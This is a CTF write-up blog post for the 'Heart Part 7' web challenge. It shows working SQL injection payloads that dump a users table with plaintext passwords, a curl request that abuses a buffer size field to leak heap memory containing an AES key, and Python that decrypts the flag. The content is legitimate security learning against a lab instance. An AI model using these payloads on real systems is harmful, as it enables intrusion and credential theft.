---
layout: post
title:  "Heart Part 7"
date:   2026-06-08 14:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /Dal-CTF-2026-heart-part-7/
---

**Title**: Heart Part 7

**Author**: kvasir

**Category**: Web

**Description**: what happens on earth stays on earth. Instance available at :  
`https://dalctf-heart-part-7-154-64616c.instancer.dalctf2026.com`

I go to the website:

![Alt text](/images/dalctfweb8.png)

There is a login page at `https://dalctf-heart-part-7-154-64616c.instancer.dalctf2026.com/login`. 

There is also a search bar on `https://dalctf-heart-part-7-154-64616c.instancer.dalctf2026.com/search` where you can search the techniques.

I start testing the search feature for SQLi and find that `' OR 1=1--` works and shows all techniques! 

The payload `' UNION SELECT sql, NULL FROM sqlite_master WHERE type='table' --` showed me 3 tables:
```shell
CREATE TABLE scrolls ( id INTEGER PRIMARY KEY, title TEXT, content_encrypted TEXT, iv TEXT ) 	None
CREATE TABLE techniques ( id INTEGER PRIMARY KEY, name TEXT, description TEXT ) 	None
CREATE TABLE users ( id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT ) 	None
```

To be able to login I pull the users and passwords from the `users` tables with `' UNION SELECT username, password FROM users-- `:
```shell
admin:duckworth	
student:grasshopper
```

I login as admin:

![Alt text](/images/dalctfweb9.png)

When I click `Get Encrypted Flag` it makes a `GET` request to `/api/flag`. Response:
```shell
HTTP/2 200 OK
Content-Type: application/json
Date: Sat, 06 Jun 2026 19:11:14 GMT
Server: Werkzeug/3.1.8 Python/3.11.15
Content-Length: 164

{"algorithm":"AES-256-CBC","ciphertext":"baCIJCXuBcIOJ23q0FS8GDaSN5/71aIqY156ju5Z6oc=","iv":"fcSvIZ1LMw72z34mvr0O5A==","sealed_by":"MAadCipher v1.0","status":"ok"}
```

So I know the flag is on the admin page and `AES-256-CBC` encrypted. I also have the `iv`. I just need the key. On `view-source:https://dalctf-heart-part-7-154-64616c.instancer.dalctf2026.com/admin` I find this:
```js
async function checkHealth() {
    try {
        const r = await fetch("/cipher/health", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                data: "PING",
                size: 4
            })
        });
        const data = await r.json();
        el("health-display").textContent = data.status === "ok" ? "M.A.A.D Cipher: Online" : "M.A.A.D Cipher: Offline";
        el("health-display").className = data.status === "ok" ? "ok" : "err";
    } catch (e) {
        el("health-display").textContent = "M.A.A.D Cipher: Offline";
        el("health-display").className = "err";
    }
    show("health-result");
}
```
It allocates a buffer of `size` bytes. It copies the `data` string into the buffer. Then returns the entire buffer.

Instead of `4` I will do `500` to get raw memory from the heap:
```shell
curl -X POST https://dalctf-heart-part-7-154-64616c.instancer.dalctf2026.com/cipher/health   -H "Content-Type: application/json" -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.GRnU_ObEj_WaG6GQOE8Y-DMsD9qhVPDvfx9YfIcNn6Q" -d '{"data":"PING","size":500}'  
{"algorithm":"AES-256-CBC","echo":"UElORwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEtFTkRSSUNLX01BU1RFUl9LRVk9nhuKX47UTkcRwPR2jBP1oza8Sm3u6jB3IKh7n8pE8C0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","service":"MAadCipher","status":"ok","version":"1.0"}
```

If I decode it I can see the output is mostly not printable, but I should have the key here: 
```shell
echo 'UElORwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEtFTkRSSUNLX01BU1RFUl9LRVk9nhuKX47UTkcRwPR2jBP1oza8Sm3u6jB3IKh7n8pE8C0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' | base64 -d  
PINGKENDRICK_MASTER_KEY=�
```

If I take the 32 bytes after `KENDRICK_MASTER_KEY=` I should have the key! Decryption:
```shell
python3  
Python 3.13.5 (main, May  5 2026, 21:05:52) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import base64  
... from Crypto.Cipher import AES  
...  
... key = bytes.fromhex("9e1b8a5f8ed44e4711c0f4768c13f5a336bc4a6deeea307720a87b9fca44f02d")  
... ciphertext = base64.b64decode("baCIJCXuBcIOJ23q0FS8GDaSN5/71aIqY156ju5Z6oc=")  
... iv = base64.b64decode("fcSvIZ1LMw72z34mvr0O5A==")  
...  
... cipher = AES.new(key, AES.MODE_CBC, iv)  
... plain = cipher.decrypt(ciphertext)  
... plain = plain[:-plain[-1]]  # remove PKCS#7 padding :p 
... print(plain.decode())  
...  
dalctf{p1mp_p1mp_h00r4y}
```

[cyberchef decryption](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'9e1b8a5f8ed44e4711c0f4768c13f5a336bc4a6deeea307720a87b9fca44f02d'%7D,%7B'option':'Base64','string':'fcSvIZ1LMw72z34mvr0O5A%3D%3D'%7D,16,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D,'Off')&input=NmRhMDg4MjQyNWVlMDVjMjBlMjc2ZGVhZDA1NGJjMTgzNjkyMzc5ZmZiZDVhMjJhNjM1ZTdhOGVlZTU5ZWE4Nw)

`dalctf{p1mp_p1mp_h00r4y}`